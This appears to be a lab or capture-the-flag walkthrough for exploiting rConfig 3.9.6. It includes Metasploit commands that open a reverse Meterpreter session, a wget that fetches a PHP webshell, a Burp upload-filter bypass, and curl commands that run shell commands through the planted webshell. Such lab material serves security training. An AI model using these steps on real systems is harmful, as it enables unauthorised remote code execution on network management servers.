# rConfig 3.9.6
**Target:** rConfig (Network Device Management Utility) 
**Vulnerability:** Unauthenticated RCE & Authenticated File Upload 
**Key Insight:** rConfig versions prior to 3.9.7 are notoriously vulnerable. Always check the footer of the login page for the version number.
## 1. Identification & Research
**Goal:** Confirm the software version and find public exploits.
### Enumeration
```shell
# Check the login page footer or source code for version "3.9.6"
curl -s http://10.129.73.149/login.php | grep "Version"
```
### Research (SearchSploit)
```shell
# Find available exploits in the Exploit-DB
searchsploit rConfig 3.9.6

# Result:
# rConfig 3.9.6 - 'vendors' Unauthenticated Remote Code Execution
# rConfig 3.9.6 - Authenticated File Upload RCE
```
## 2. Automated Exploitation (Metasploit)
**Method:** Uses the unauthenticated RCE vulnerability in the `vendors.php` file.
```shell
# 1. Start Metasploit
msfconsole

# 2. Search for rConfig modules
msf6 > search rconfig

# 3. Select the specific exploit (Unauthenticated RCE)
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

# 4. Configure Options
msf6 > set RHOSTS 10.129.73.149
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 4444

# 5. Execute
msf6 > exploit
# Result: Meterpreter session opened.
```
## 3. Manual Exploitation (Authenticated File Upload)
**Scenario:** You have credentials (`admin:admin`) but Metasploit is banned/failing. You must upload a PHP webshell manually. 
**Mechanism:** The application checks the file extension on the client-side or loosely on the server. We will intercept the request to bypass this.
### Step 1: Preparation
```shell
# Download a simple PHP webshell
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
mv webshell.php shell.jpg
# Note: We rename it to .jpg locally to pass the initial browser check.
```
### Step 2: The Upload Process
1. **Login:** Navigate to `http://10.129.73.149` and login with `admin:admin`. 
2. **Navigate:** Go to **Devices > Vendors**.
3. **Edit:** Click "Edit" on any existing vendor (e.g., "NetVen").
4. **Upload:** Click "Choose File" and select `shell.jpg`.
5. **Intercept:** Enable **Burp Suite Intercept**. Click "Save".
### Step 3: Burp Suite Bypass
In the intercepted POST request, modify the filename:
```http
Content-Disposition: form-data; name="vendorLogo"; filename="shell.php"
Content-Type: image/jpeg
```
- **Action:** Change `filename="shell.jpg"` to `filename="shell.php"`. 
- **Forward:** Send the modified request.
## Step 4: Execution
The file is typically uploaded to the `/images/vendor/` directory.
```shell
# Trigger the shell via browser or curl
curl http://10.129.73.149/images/vendor/shell.php?cmd=id

# Response:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```